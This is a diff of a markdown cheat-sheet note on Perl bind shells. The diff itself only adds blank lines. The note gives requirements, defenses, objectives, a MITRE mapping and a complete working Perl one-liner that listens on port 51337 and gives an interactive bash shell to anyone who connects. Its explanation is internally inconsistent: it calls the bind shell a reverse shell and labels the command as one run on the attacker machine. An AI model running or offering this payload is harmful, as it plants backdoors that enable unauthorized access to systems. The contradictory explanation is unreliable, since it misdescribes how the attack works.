@@ -38,6 +38,8 @@ From a technical perspective, a Perl bind shell is created by writing a Perl scr
 
 From a business perspective, a Perl bind shell can be used by attackers to steal sensitive data, install malware, or disrupt business operations. Organizations can mitigate the risk of Perl bind shells by implementing network segmentation, monitoring network traffic for suspicious activity, and restricting access to critical systems.
 
+ 
+
 ## Requirements
 
 1. Access to the target system
@@ -45,6 +47,8 @@ From a business perspective, a Perl bind shell can be used by attackers to steal
 1. Ability to execute Perl scripts on the target system
 
 1. Network access to the target system
+
+ 
 
 ## Defense
 
@@ -54,6 +58,8 @@ From a business perspective, a Perl bind shell can be used by attackers to steal
 
 1. Restrict access to critical systems to limit the impact of a Perl bind shell
 
+ 
+
 ## Objectives
 
 1. Gain persistent access to a compromised system
@@ -62,13 +68,23 @@ From a business perspective, a Perl bind shell can be used by attackers to steal
 
 1. Escalate privileges on compromised systems
 
+ 
+
 # Instructions
 
 1. This command creates a reverse shell using Perl programming language. It opens a socket and listens on port 51337 for incoming connections. Once a connection is established, it opens a bash shell on the remote machine with standard input, output and error redirected to the socket. This allows the attacker to execute commands on the remote machine and receive their output.
 
+ 
+
+
+
 **Code**: [[perl -e 'use Socket;$p=51337;socket(S,PF_INET,SOCK]]
 
+
+
 > The command uses the Perl Socket module to create a TCP socket. The bind function binds the socket to port 51337 and INADDR_ANY address, which means it will listen on all network interfaces. The listen function sets the maximum number of queued connections to SOMAXCONN, which is a system-defined constant. The for loop waits for incoming connections and accepts them with the accept function. Once a connection is accepted, it opens three file descriptors for standard input, output and error, and redirects them to the socket using the dup2 function. Finally, it executes the /bin/bash shell using the exec function.
+
+
 
 **Command** ([[Open a listener on attacker machine]]):
 
@@ -77,6 +93,8 @@ perl -e 'use Socket;$p=51337;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"))
 bind(S,sockaddr_in($p, INADDR_ANY));listen(S,SOMAXCONN);for(;$p=accept(C,S);\
 close C){open(STDIN,">&C");open(STDOUT,">&C");open(STDERR,">&C");exec("/bin/bash -i");};'
 ```
+
+
 
 ## MITRE ATT&CK Mapping
 
@@ -99,3 +117,5 @@ close C){open(STDIN,">&C");open(STDOUT,">&C");open(STDERR,">&C");exec("/bin/bash
 
 - [[Bind Shell]]
 - [[Perl]]
+
+
